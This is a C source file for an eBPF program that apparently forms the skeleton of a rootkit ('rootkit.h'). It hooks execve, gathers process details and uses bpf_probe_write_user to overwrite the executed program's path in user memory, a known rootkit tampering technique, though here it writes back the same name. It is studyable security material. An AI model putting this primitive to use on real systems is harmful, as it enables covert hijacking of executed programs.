#include "vmlinux.h"

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include "rootkit.h"

// maps macros

#define BPF_MAP(_name, _type, _key_type, _value_type, _max_entries)									\
    struct {                                                                                       	\
        __uint(type, _type);                                                                       	\
        __uint(max_entries, _max_entries);                                                         	\
        __type(key, _key_type);                                                                    	\
        __type(value, _value_type);                                                                	\
    } _name SEC(".maps");

#define BPF_PERF_OUTPUT(_name) 																		\
	BPF_MAP(_name, BPF_MAP_TYPE_PERF_EVENT_ARRAY, int, __u32, 1024)

#define BPF_ARRAY(_name, _value_type, _max_entries)                                                	\
    BPF_MAP(_name, BPF_MAP_TYPE_ARRAY, u32, _value_type, _max_entries)

// helper macros

#define READ_KERN(ptr) 																			   	\
	({ typeof(ptr) _val;																		   	\
	__builtin_memset(&_val, 0, sizeof(_val));													   	\
	bpf_core_read(&_val, sizeof(_val), &ptr);													   	\
	_val;																						   	\
	})

#define __get_arr_elem_addr(array, node_type, index)                                               	\
    ((node_type *) ((void *) array + (index * bpf_core_type_size(node_type))))
#define GET_ARR_ELEM_ADDR(array, index) __get_arr_elem_addr(array, typeof(*array), index)

/* Helper macro to print out debug messages */
#define bpf_myprintk(fmt, ...)                            											\
({                                                      											\
        char ____fmt[] = fmt;                           											\
        bpf_trace_printk(____fmt, sizeof(____fmt),      											\
                         ##__VA_ARGS__);                											\
})

// maps

BPF_PERF_OUTPUT(events);

// helper functions

static __always_inline u32 get_task_ppid(struct task_struct *task)
{
	struct task_struct *parent = READ_KERN(task->real_parent);
	return READ_KERN(parent->pid);
}

static __always_inline u32 get_task_pid_vnr(struct task_struct *task)
{
	// assuming that kernel version >= 5.0
	struct pid *pid = READ_KERN(task->thread_pid);

	unsigned int level = READ_KERN(pid->level);

	struct upid *nums = &(pid->numbers[0]);
	struct upid *relevent_num = GET_ARR_ELEM_ADDR(nums, level);

	int nr = READ_KERN(relevent_num->nr);

	return nr;
}

static __always_inline u32 get_task_ns_tgid(struct task_struct *task)
{
	struct task_struct *group_leader = READ_KERN(task->group_leader);
    return get_task_pid_vnr(group_leader);
}

static __always_inline int init_context(context_t *context, struct task_struct *task)
{
	context->ts = bpf_ktime_get_ns();
	u64 id = bpf_get_current_pid_tgid();
	context->host_tid = id;
	context->host_pid = id >> 32;
	context->pid = get_task_ns_tgid(task);
	context->host_ppid = get_task_ppid(task);
	context->uid = bpf_get_current_uid_gid();
	bpf_get_current_comm(&context->comm, sizeof(context->comm));

	return 0;
}

// BPF prog

SEC("tracepoint/syscalls/sys_enter_execve")
int handle_execve_enter(struct trace_event_raw_sys_enter *ctx)
{
	context_t context = {};
	init_context(&context, (struct task_struct *) bpf_get_current_task());

	char *fn_ptr = (char *) (ctx->args[0]);
	bpf_core_read_user_str(&context.prog_name, sizeof(context.prog_name), fn_ptr);

	long ret = bpf_probe_write_user((void*)ctx->args[0], &context.prog_name, MAX_PATH_LEN);

	return bpf_perf_event_output(ctx, &events, 0xffffffffULL, &context, sizeof(context));
}

// global license var
char LICENSE[] SEC("license") = "GPL";